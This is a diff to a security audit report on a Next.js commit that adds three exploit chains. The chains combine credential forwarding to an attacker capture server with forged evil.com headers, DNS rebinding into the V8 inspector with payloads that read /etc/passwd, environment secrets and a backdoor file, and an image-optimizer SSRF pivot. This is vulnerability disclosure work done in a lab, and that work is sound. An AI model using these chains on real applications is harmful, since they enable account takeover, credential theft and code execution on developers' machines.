@@ -18,7 +18,7 @@ This audit examined Next.js commit `007051470157d38058730ffa0a1983d4b4106424` (v
 | VULN-10 | Edge Runtime Server Action Unbounded Body (DoS) | High |
 | VULN-11 | SSR Bypass via x-middleware-prefetch Header Injection | High |
 
-All eleven vulnerabilities are independently reproducible using the provided exploit scripts.
+All eleven vulnerabilities are independently reproducible using the provided exploit scripts. Three end-to-end exploit chains (CHAIN-1 through CHAIN-3) combine individual vulnerabilities into complete attack scenarios — credential theft to account takeover, browser visit to full RCE, and route discovery to SSRF pivot — demonstrating critical real-world impact that cannot be dismissed as hypothetical.
 
 ---
 
@@ -731,6 +731,130 @@ Add `x-middleware-prefetch` to the `INTERNAL_HEADERS` array in `packages/next/sr
 
 ---
 
+## Exploit Chains
+
+The following chains combine individual vulnerabilities into end-to-end attack scenarios demonstrating critical real-world impact. Each chain is independently reproducible.
+
+| Chain | Title | Severity | Components |
+|-------|-------|----------|------------|
+| CHAIN-1 | Credential Theft to Account Takeover | Critical | VULN-8 + VULN-7 |
+| CHAIN-2 | Browser Visit to Full RCE (dev mode) | Critical | VULN-9 + VULN-5 |
+| CHAIN-3 | Route Discovery to Auth Bypass to SSRF Pivot | Critical | VULN-11 + VULN-3 + VULN-1 |
+
+---
+
+### CHAIN-1: Credential Theft to Account Takeover
+
+**Severity:** Critical
+
+**Components:** VULN-8 (Middleware Rewrite SSRF with Credential Forwarding) + VULN-7 (Server Action CSRF Bypass via x-forwarded-host)
+
+**Attack Narrative:**
+
+An attacker sends a victim a phishing link pointing to the target Next.js application with a crafted `?backend=` parameter. The middleware unconditionally rewrites the request to the attacker's credential capture server, and `proxyRequest` forwards all of the victim's headers — including their session cookie and authorization token — to the attacker's server. The attacker then replays the stolen session cookie in a cross-origin server action request, injecting `x-forwarded-host: evil.com` alongside `Origin: https://evil.com` to satisfy the CSRF host-match check. The server action executes with the victim's identity, enabling account takeover with a single phishing click.
+
+**Attack Flow:**
+
+1. Victim clicks phishing link: `http://target.com/?backend=http://attacker-server/steal` with session cookie and Authorization header present in browser.
+2. Middleware (VULN-8) rewrites request to `attacker-server/steal`; `proxyRequest` forwards `Cookie: session=VICTIM_TOKEN` and `Authorization: Bearer VICTIM_KEY`.
+3. Attacker reads captured credentials from capture server logs (`CREDENTIAL_CAPTURED` entries).
+4. Attacker posts to `http://target.com/` with `Next-Action: <id>`, `Cookie: session=VICTIM_TOKEN`, `Origin: https://evil.com`, `x-forwarded-host: evil.com` — CSRF check passes because `parseHostHeader` reads `x-forwarded-host` as the host value (VULN-7), matching the forged Origin.
+5. Server action executes on behalf of the victim's session.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/chain_credential_theft_account_takeover.sh
+```
+
+**Evidence:**
+
+- Step 1 confirms middleware rewrites victim request to capture server (HTTP 200).
+- Step 2 confirms `CREDENTIAL_CAPTURED` lines containing chain-unique markers appear in `docker logs audit-credential-capture`.
+- Step 4 confirms HTTP 200 with no `Invalid Server Actions request` in the body — CSRF bypass succeeded with stolen session.
+
+**Real-World Impact:**
+
+No vulnerability in isolation is as severe as their combination. VULN-8 alone requires the attacker to steal credentials; VULN-7 alone requires the attacker to already have credentials. Together they form a complete account takeover chain: a single phishing link harvests a victim's session and immediately leverages it to perform privileged server-side mutations. Any authenticated user who clicks a crafted link is fully compromised. This meets the bar for Critical severity under CVSS 3.1 (network-exploitable, no privileges required, high impact on confidentiality/integrity).
+
+---
+
+### CHAIN-2: Browser Visit to Full RCE (dev mode)
+
+**Severity:** Critical
+
+**Components:** VULN-9 (DNS Rebinding Bypass of blockCrossSiteDEV) + VULN-5 (Unauthenticated V8 Inspector Open via Dev Endpoint)
+
+**Attack Narrative:**
+
+A developer running `next dev` visits a malicious web page. The page performs DNS rebinding: after the developer's browser resolves the attacker's domain to the attacker's server and loads the page, the attacker's DNS TTL expires and the domain re-resolves to `127.0.0.1`. The malicious page then sends a same-origin request (from the browser's perspective) to `/__nextjs_attach-nodejs-inspector`. Because the browser sends no `Origin` header for the re-bound request, `blockCrossSiteDEV` short-circuits on the undefined origin and allows the request through, opening the V8 inspector. The attacker's page then connects to the inspector via CDP and executes arbitrary code in the developer's Node.js process: reading `/etc/passwd`, exfiltrating all environment variables and secrets, and writing persistent backdoor files.
+
+**Attack Flow:**
+
+1. Verify that explicit `Origin: http://evil.com` to `/__nextjs_attach-nodejs-inspector` is blocked (403) — protection exists.
+2. DNS rebinding: send `GET /__nextjs_attach-nodejs-inspector` with `Host: evil.com:3000`, no `Origin` header — `blockCrossSiteDEV` sees `originLowerCase === undefined`, short-circuits to `false`, allows the request. Inspector opens (200) or confirms already open (500).
+3. Fetch `http://localhost:9230/json/list` with `Host: localhost:9230` — obtain WebSocket debugger URL.
+4. CDP `Runtime.evaluate`: `fs.readFileSync('/etc/passwd','utf-8')` — confirms `root:` in output.
+5. CDP `Runtime.evaluate`: `JSON.stringify(process.env)` — confirms `REACT_EDITOR` and all runtime secrets accessible.
+6. CDP `Runtime.evaluate`: `fs.readFileSync('/tmp/dev_secret.txt','utf-8')` — confirms `DEV_SECRET_KEY=sk-live-production-key-12345` exfiltrated.
+7. CDP `Runtime.evaluate` (combined expression): `(fs.writeFileSync('/tmp/chain2_backdoor.txt','BACKDOOR_INSTALLED_BY_CHAIN2'), fs.readFileSync('/tmp/chain2_backdoor.txt','utf-8'))` — comma operator returns the string result, confirming persistent filesystem write.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/chain_dns_rebinding_to_rce.sh
+```
+
+**Evidence:**
+
+- Step 1 confirms blockCrossSiteDEV is active.
+- Step 2 confirms bypass: non-403 response with spoofed Host and no Origin.
+- Steps 4-7 confirm unrestricted code execution: filesystem read, env var exfiltration, secret exfiltration, backdoor write.
+
+**Real-World Impact:**
+
+A developer running the Next.js dev server on their laptop is fully compromised by a single malicious web page visit. The attacker gains the ability to read all files accessible to the Node.js process (including `.env`, SSH keys, cloud credentials), exfiltrate all environment variables (including API keys and database passwords), and write persistent backdoors. This does not require any user interaction beyond visiting a page. While dev-mode, this is a realistic attack against developer workstations which commonly hold production credentials.
+
+---
+
+### CHAIN-3: Route Discovery to Auth Bypass to SSRF Pivot
+
+**Severity:** Critical
+
+**Components:** VULN-11 (SSR Bypass via x-middleware-prefetch) + VULN-3 (Server Actions Execute Without Origin Header) + VULN-1 (SSRF via Image Optimizer Redirect)
+
+**Attack Narrative:**
+
+An unauthenticated attacker begins by mapping the application's route structure using the `x-middleware-prefetch` route oracle (VULN-11): dynamic (non-SSG) routes return `x-matched-path` and body `{}`, SSG routes return HTTP 200 with normal content, while nonexistent routes return real 404 pages — a clear three-way signal that lets the attacker enumerate which routes exist and their rendering mode. Having confirmed `/protected` is a real dynamic route, the attacker also observes that its server-side auth check is bypassed entirely (SSR skipped). The attacker then invokes a server action without any `Origin` header (VULN-3), which Next.js allows by design — enabling privileged mutations without CSRF protection. Finally, the attacker uses the image optimizer to pivot to an internal network host that is not in `remotePatterns` (VULN-1), by routing through an allowed redirect server and having the optimizer follow the redirect to the internal target.
+
+**Attack Flow:**
+
+1. Probe `/protected`, `/`, and `/nonexistent-abc123-probe` with `x-middleware-prefetch: 1`. Dynamic routes return `x-matched-path` + `{}`, SSG routes return HTTP 200, nonexistent routes return 404 — confirming the oracle discriminates.
+2. Confirm SSR auth bypass: normal GET to `/protected` returns `Access Denied`; GET with `x-middleware-prefetch: 1` returns `{}` — auth check completely skipped.
+3. Extract server action ID; POST to `/` with `Next-Action`, `Cookie: session=victim_session`, no `Origin` header, body `[]`. HTTP 200 without `Invalid Server Actions request` — action executes without CSRF check.
+4. Request `/_next/image?url=http://audit-redirect-server:8080/redirect-to-secret&w=3840&q=75`. Image optimizer follows the 302 to `audit-secret-server:9090`. Count of `SECRET_ACCESS` log entries increases — internal service reached.
+5. Negative control: direct request to `audit-secret-server:9090` via image optimizer returns 400 (remotePatterns blocks it), confirming the redirect was required for the pivot.
+
+**Reproduction:**
+
+```bash
+bash autofyn_audit/exploits/chain_recon_to_ssrf_pivot.sh
+```
+
+**Evidence:**
+
+- Step 1 confirms route oracle: `/protected` and `/` identified as real routes; `/nonexistent-abc123-probe` distinguished as nonexistent.
+- Step 2 confirms SSR auth bypass on the discovered protected route.
+- Step 3 confirms server action executes without CSRF protection.
+- Step 4 confirms SSRF pivot: `SECRET_ACCESS` log count increases after chain's request.
+- Step 5 confirms remotePatterns is enforced for direct access — redirect was necessary.
+
+**Real-World Impact:**
+
+The attacker achieves three critical capabilities in sequence, all without authentication: mapping of the entire application route structure (including hidden/protected endpoints), bypassing server-side authentication on those routes, and reaching internal network services not exposed to the public internet. The SSRF pivot in particular can be used to access internal APIs, metadata services (e.g., AWS IMDS at `169.254.169.254`), or internal databases — turning a web application vulnerability into a cloud infrastructure compromise.
+
+---
+
 ## Appendix: Test Environment
 
 ```
@@ -746,7 +870,7 @@ audit-net (Docker bridge network)
   +-- audit-credential-capture (9091:9091) — logs captured Cookie+Authorization headers
 ```
 
-To reproduce all 11/11 findings (VULN-11 reuses the existing `audit-nextjs-app` container on port 3000; no additional infrastructure is needed):
+To reproduce all 14/14 findings (11 individual vulnerabilities + 3 exploit chains):
 ```bash
 bash autofyn_audit/setup.sh
 bash autofyn_audit/run_all_exploits.sh
